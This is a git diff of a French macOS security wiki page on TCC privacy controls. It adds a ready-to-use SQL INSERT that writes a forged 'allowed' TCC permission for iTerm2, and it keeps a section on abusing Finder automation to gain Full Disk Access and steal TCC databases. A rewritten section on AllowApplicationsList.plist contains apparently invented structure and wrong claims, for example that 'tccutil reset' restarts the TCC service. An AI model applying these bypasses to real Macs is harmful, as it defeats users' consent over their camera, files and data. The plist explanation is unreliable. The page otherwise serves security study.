@@ -83,7 +83,7 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {% endcode %}
 {% endtab %}
 
-{% tab title="Base de données système" %}
+{% tab title="base de données système" %}
 {% code overflow="wrap" %}
 ```bash
 sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
@@ -145,7 +145,7 @@ De plus, **`kTCCServiceSystemPolicySysAdminFiles`** permet de **modifier** l'att
 Vous pouvez également vérifier les **autorisations déjà accordées** aux applications dans `Préférences Système --> Sécurité et confidentialité --> Confidentialité --> Fichiers et dossiers`.
 
 {% hint style="success" %}
-Notez que même si l'une des bases de données se trouve dans le dossier personnel de l'utilisateur, les utilisateurs ne peuvent pas modifier directement ces bases de données en raison de SIP (même si vous êtes root). La seule façon de configurer ou de modifier une nouvelle règle est via le panneau Préférences Système ou les invites où l'application demande à l'utilisateur.
+Notez que même si l'une des bases de données se trouve dans le dossier personnel de l'utilisateur, **les utilisateurs ne peuvent pas modifier directement ces bases de données en raison de SIP** (même si vous êtes root). La seule façon de configurer ou de modifier une nouvelle règle est via le panneau Préférences Système ou les invites où l'application demande à l'utilisateur.
 
 Cependant, n'oubliez pas que les utilisateurs peuvent **supprimer ou interroger des règles** en utilisant **`tccutil`**.
 {% endhint %}
@@ -165,7 +165,7 @@ La **base de données** TCC stocke l'**ID de bundle** de l'application, mais ell
 {% code overflow="wrap" %}
 ```bash
 # From sqlite
-sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
+sqlite> select service, client, hex(csreq) from access where auth_value=2;
 #Get csreq
 
 # From bash
@@ -187,7 +187,7 @@ Par exemple, **Telegram** a l'attribution `com.apple.security.device.camera` pou
 
 Cependant, pour que les applications **accèdent** à **certains dossiers utilisateur**, tels que `~/Desktop`, `~/Downloads` et `~/Documents`, elles **n'ont pas besoin** d'avoir des **attributions spécifiques**. Le système gérera l'accès de manière transparente et **invitera l'utilisateur** au besoin.
 
-Les applications d'Apple **ne génèrent pas de fenêtres contextuelles**. Elles contiennent des **droits préalablement accordés** dans leur liste d'attributions, ce qui signifie qu'elles ne **généreront jamais de fenêtre contextuelle** et ne figureront pas dans les **bases de données TCC**. Par exemple:
+Les applications d'Apple **ne génèrent pas de fenêtres contextuelles**. Elles contiennent des **droits préalablement accordés** dans leur liste d'attributions, ce qui signifie qu'elles ne **généreront jamais de fenêtre contextuelle** et ne figureront pas dans l'une des **bases de données TCC**. Par exemple:
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -198,7 +198,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 <string>kTCCServiceAddressBook</string>
 </array>
 ```
-Cela évitera à Calendar de demander à l'utilisateur l'accès aux rappels, au calendrier et au carnet d'adresses.
+Cela évitera à Calendar de demander à l'utilisateur d'accéder aux rappels, au calendrier et au carnet d'adresses.
 
 {% hint style="success" %}
 En dehors de la documentation officielle sur les droits, il est également possible de trouver des informations non officielles intéressantes sur les droits dans [https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)
@@ -235,11 +235,53 @@ Notez également que si vous déplacez un fichier qui autorise l'UUID d'une appl
 
 L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus car il est **protégé par SIP**. Cependant, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **compressant** le fichier, en le **supprimant** et en le **décompressant**.
 
-## Privilèges TCC et contournements
+## Privilèges et contournements de TCC
 
-### Élévation de privilèges de l'automatisation à la FDA
+### Insérer dans TCC
 
-**Finder** est une application qui **a toujours la FDA** (même si elle n'apparaît pas dans l'interface utilisateur), donc si vous avez des privilèges d'**automatisation** dessus, vous pouvez abuser de ses privilèges pour **lui faire effectuer certaines actions**.
+Si à un moment donné vous parvenez à obtenir un accès en écriture sur une base de données TCC, vous pouvez utiliser quelque chose comme ce qui suit pour ajouter une entrée (supprimez les commentaires) :
+```
+INSERT INTO access (
+service,
+client,
+client_type,
+auth_value,
+auth_reason,
+auth_version,
+csreq,
+policy_id,
+indirect_object_identifier_type,
+indirect_object_identifier,
+indirect_object_code_identity,
+flags,
+last_modified,
+pid,
+pid_version,
+boot_uuid,
+last_reminded
+) VALUES (
+'kTCCServiceSystemPolicyDesktopFolder', -- service
+'com.googlecode.iterm2', -- client
+0, -- client_type (0 - bundle id)
+2, -- auth_value  (2 - allowed)
+3, -- auth_reason (3 - "User Set")
+1, -- auth_version (always 1)
+X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
+NULL, -- policy_id
+NULL, -- indirect_object_identifier_type
+'UNUSED', -- indirect_object_identifier - default value
+NULL, -- indirect_object_code_identity
+0, -- flags
+strftime('%s', 'now'), -- last_modified with default current timestamp
+NULL, -- assuming pid is an integer and optional
+NULL, -- assuming pid_version is an integer and optional
+'UNUSED', -- default value for boot_uuid
+strftime('%s', 'now') -- last_reminded with default current timestamp
+);
+```
+### Privesc de l'automatisation à la FDA
+
+**Finder** est une application qui a toujours la FDA (même si elle n'apparaît pas dans l'interface utilisateur), donc si vous avez des privilèges d'automatisation dessus, vous pouvez abuser de ses privilèges pour lui faire effectuer certaines actions.
 
 {% tabs %}
 {% tab title="Vol de la base de données TCC des utilisateurs" %}
@@ -305,15 +347,49 @@ codesign -d -r- /System/Applications/Utilities/Terminal.app
 ```
 AllowApplicationsList.plist:
 
-Ce fichier plist est utilisé par macOS pour gérer la liste des applications autorisées à accéder aux données sensibles protégées par le TCC (Transparency, Consent, and Control). Le TCC est un mécanisme de sécurité intégré à macOS qui permet aux utilisateurs de contrôler l'accès des applications à certaines fonctionnalités et données sensibles, telles que la caméra, le microphone, les contacts, les photos, etc.
+Ce fichier plist est utilisé par macOS pour gérer la liste des applications autorisées à accéder aux données protégées par le TCC (Transparency, Consent, and Control). Le TCC est un mécanisme de sécurité intégré à macOS qui protège les données sensibles de l'utilisateur en limitant l'accès des applications.
 
-Dans ce fichier plist, vous pouvez spécifier les applications qui sont autorisées à accéder à ces données sensibles. Chaque application est répertoriée avec son identifiant de bundle (Bundle ID). Vous pouvez ajouter ou supprimer des entrées dans ce fichier pour personnaliser les autorisations d'accès des applications.
+Dans ce fichier, vous pouvez spécifier les applications qui sont autorisées à accéder à des données telles que la caméra, le microphone, les contacts, les calendriers, les photos, etc. Chaque application est répertoriée avec son identifiant de bundle (Bundle ID) et son niveau d'autorisation.
 
-Il est important de noter que la modification de ce fichier plist nécessite des privilèges d'administrateur. Par conséquent, seuls les utilisateurs disposant des droits d'administration peuvent apporter des modifications à ce fichier.
+Il est important de noter que la modification de ce fichier nécessite des privilèges d'administrateur et peut avoir des conséquences sur le fonctionnement des applications. Il est recommandé de faire preuve de prudence lors de la modification de ce fichier et de s'assurer de comprendre les implications de chaque modification.
 
-Pour modifier le fichier AllowApplicationsList.plist, vous pouvez utiliser un éditeur de texte ou la commande `defaults` en ligne de commande. Assurez-vous de sauvegarder une copie du fichier d'origine avant d'apporter des modifications, au cas où vous auriez besoin de revenir à la configuration précédente.
+Pour ajouter une application à la liste des autorisations, vous devez ajouter une nouvelle entrée avec le Bundle ID de l'application et spécifier le niveau d'autorisation souhaité. Les niveaux d'autorisation disponibles sont :
 
-Une fois que vous avez modifié le fichier AllowApplicationsList.plist, vous devrez peut-être redémarrer votre système pour que les modifications prennent effet.
+- `TCCServiceCamera` : autorise l'accès à la caméra.
+- `TCCServiceMicrophone` : autorise l'accès au microphone.
+- `TCCServicePhotos` : autorise l'accès aux photos.
+- `TCCServiceContacts` : autorise l'accès aux contacts.
+- `TCCServiceCalendar` : autorise l'accès au calendrier.
+- `TCCServiceReminders` : autorise l'accès aux rappels.
+- `TCCServiceBluetoothPeripheral` : autorise l'accès aux périphériques Bluetooth.
+- `TCCServiceAppleEvents` : autorise l'accès aux événements AppleScript.
+
+Voici un exemple de structure de fichier AllowApplicationsList.plist :
+
+```xml
+<dict>
+    <key>TCCServiceCamera</key>
+    <dict>
+        <key>Allowed</key>
+        <true/>
+        <key>BundleId</key>
+        <string>com.example.app</string>
+    </dict>
+    <key>TCCServiceMicrophone</key>
+    <dict>
+        <key>Allowed</key>
+        <true/>
+        <key>BundleId</key>
+        <string>com.example.app</string>
+    </dict>
+</dict>
+```
+
+Dans cet exemple, l'application avec l'identifiant de bundle `com.example.app` est autorisée à accéder à la caméra et au microphone.
+
+Une fois que vous avez modifié le fichier AllowApplicationsList.plist, vous devez redémarrer le service TCC pour que les modifications prennent effet. Cela peut être fait en utilisant la commande `tccutil reset` dans le terminal.
+
+Il est recommandé de sauvegarder le fichier AllowApplicationsList.plist avant toute modification, afin de pouvoir restaurer les autorisations par défaut si nécessaire.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
